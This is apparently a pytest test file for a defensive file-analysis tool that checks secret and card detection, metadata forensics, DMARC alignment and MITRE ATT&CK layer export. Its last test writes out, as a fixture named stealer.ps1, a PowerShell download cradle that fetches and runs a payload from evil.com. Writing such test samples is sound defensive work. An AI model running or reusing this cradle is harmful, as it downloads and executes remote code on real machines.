import pytest
from app.analyzers.dlp_analyzer import DLPAnalyzer, _luhn_check, _iban_check
from app.analyzers.metadata_extractor import detect_metadata_anomalies, MetadataExtractor
from app.analyzers.mitre_attack import MitreAttackMapper
from app.analyzers.reputation_client import MalwareBazaarClient
from app.core.job_manager import JobManager
from fastapi.testclient import TestClient
from app.main import app


def test_dlp_secrets_and_cloud_credentials():
    """Verify detection and masking of cloud API keys, private keys, and tokens."""
    dummy_aws = "AKIA" + "IOSFODNN7EXAMPLE"
    dummy_gh = "ghp_" + "123456789012345678901234567890123456"
    dummy_slack = "https://" + "hooks." + "slack.com/services/T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX"
    content = f"""
    # Config file
    AWS_KEY={dummy_aws}
    GITHUB_PAT={dummy_gh}
    SLACK_URL={dummy_slack}
    -----BEGIN RSA PRIVATE KEY-----
    MIIEowIBAAKCAQEA0Y...
    -----END RSA PRIVATE KEY-----
    """
    findings = DLPAnalyzer.scan_text(content, source_label="test_config.env")
    assert len(findings) >= 3

    categories = [f.category for f in findings]
    assert all(c == "dlp" for c in categories)

    titles = [f.title for f in findings]
    assert any("AWS Access Key" in t for t in titles)
    assert any("GitHub Personal Access Token" in t for t in titles)
    assert any("Private Key Block" in t for t in titles)

    # Ensure secrets are safely redacted in findings
    for f in findings:
        for sample in f.details.get("redacted_samples", []):
            assert "*" in sample


def test_dlp_credit_card_luhn_validation():
    """Ensure credit card detection enforces the Luhn algorithm to prevent false positives."""
    # 4532-0150-1234-5671 passes Luhn mod-10
    assert _luhn_check("4532015012345671") is True
    # 4532-0150-1234-5670 fails Luhn mod-10
    assert _luhn_check("4532015012345670") is False

    text_with_valid = "Customer paid using card: 4532-0150-1234-5671 on terminal 9."
    findings_valid = DLPAnalyzer.scan_text(text_with_valid)
    assert len(findings_valid) == 1
    assert "Payment Card" in findings_valid[0].title
    assert "4532********5671" in findings_valid[0].details["redacted_samples"]

    text_with_invalid = "Order tracking sequence is 4532-0150-1234-5670."
    findings_invalid = DLPAnalyzer.scan_text(text_with_invalid)
    assert len(findings_invalid) == 0


def test_dlp_iban_mod97_validation():
    """Ensure IBAN verification passes ISO 13616 Mod-97 check."""
    # GB82 WEST 1234 5698 7654 32 is a valid test IBAN
    valid_iban = "GB82WEST12345698765432"
    assert _iban_check(valid_iban) is True
    assert _iban_check("GB82WEST12345698765430") is False

    text = f"Payment routing IBAN: {valid_iban}"
    findings = DLPAnalyzer.scan_text(text)
    assert len(findings) == 1
    assert "IBAN Bank Account" in findings[0].title
    assert "*" in findings[0].details["redacted_samples"][0]


def test_metadata_forensic_timestomping_anomaly():
    """Verify forensic timestomping detection when creation date is posterior to modification date."""
    doc_meta = {
        "created": "2026-10-01 12:00:00",
        "modified": "2021-05-15 08:30:00",
        "author": "Administrator",
        "producer": "wkhtmltopdf 0.12.5"
    }
    anomalies, findings = detect_metadata_anomalies(doc_meta)
    assert len(anomalies) >= 3

    types = [a["type"] for a in anomalies]
    assert "timestomping_reversed" in types
    assert "generic_author" in types
    assert "scripted_producer" in types

    finding_titles = [f.title for f in findings]
    assert any("Timestomping" in t for t in finding_titles)
    assert any("Author Profile Anomaly" in t for t in finding_titles)


def test_dmarc_identifier_alignment_detection():
    """Verify DMARC RFC 7489 identifier alignment between From domain, SPF, and DKIM."""
    from app.analyzers.email_analyzer import EmailAnalyzer
    analyzer = EmailAnalyzer()

    # Case 1: Unaligned DKIM and SPF (attacker sending from spoofed @paypal.com via @attacker.com)
    headers = {
        "from": "PayPal Security <security@paypal.com>",
        "return-path": "<bounce@attacker.com>",
        "received-spf": "Pass (protection.outlook.com: domain of attacker.com designates 192.0.2.1 as permitted sender)",
        "dkim-signature": "v=1; a=rsa-sha256; d=attacker.com; s=selector1; ...",
        "authentication-results": "spf=pass smtp.mailfrom=attacker.com; dkim=pass header.d=attacker.com; dmarc=none"
    }
    findings = []
    auth_data = analyzer._inspect_authentication(headers, findings)

    assert auth_data["alignment"]["spf_aligned"] is False
    assert auth_data["alignment"]["dkim_aligned"] is False
    assert auth_data["alignment"]["dmarc_aligned"] is False
    assert auth_data["overall_trust"] == "UNTRUSTED / SPOOFED"

    titles = [f.title for f in findings]
    assert any("DKIM Identifier Alignment Failed" in t for t in titles)
    assert any("SPF Identifier Alignment Failed" in t for t in titles)
    assert any("DMARC Identifier Alignment Broken" in t for t in titles)


def test_mitre_attack_navigator_layer_generation():
    """Verify ATT&CK Navigator v4.5 layer export schema and technique mapping."""
    techniques = [
        {
            "technique_id": "T1059.001",
            "technique_name": "PowerShell",
            "tactic_id": "TA0002",
            "tactic_name": "Execution",
            "severity": "CRITICAL",
            "evidence": ["IEX download cradle"]
        },
        {
            "technique_id": "T1552.001",
            "technique_name": "Credentials In Files",
            "tactic_id": "TA0006",
            "tactic_name": "Credential Access",
            "severity": "HIGH",
            "evidence": ["AWS Access Key ID AKIA..."]
        }
    ]
    layer = MitreAttackMapper.generate_navigator_layer(techniques, "malicious_script.ps1")
    assert layer["versions"]["navigator"] == "4.5"
    assert layer["domain"] == "enterprise-attack"
    assert len(layer["techniques"]) == 2
    assert layer["techniques"][0]["techniqueID"] == "T1059.001"
    assert layer["techniques"][0]["color"] == "#ef4444"
    assert layer["techniques"][1]["techniqueID"] == "T1552.001"


def test_api_attack_navigator_download_endpoint():
    """Verify API endpoint GET /jobs/{job_id}/attack-navigator serves valid JSON layer."""
    client = TestClient(app)
    jm = JobManager()
    dummy_key = "AKIA" + "1234567890ABCDEF"
    test_script = f"$x = IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1'); {dummy_key}".encode()
    job = jm.create_job(file_bytes=test_script, raw_filename="stealer.ps1")
    jm.execute_analysis_pipeline(job.job_id)

    resp = client.get(f"/api/jobs/{job.job_id}/attack-navigator")
    assert resp.status_code == 200
    data = resp.json()
    assert data["versions"]["navigator"] == "4.5"
    assert "FileSanitizer" in data["name"]
    assert len(data["techniques"]) > 0
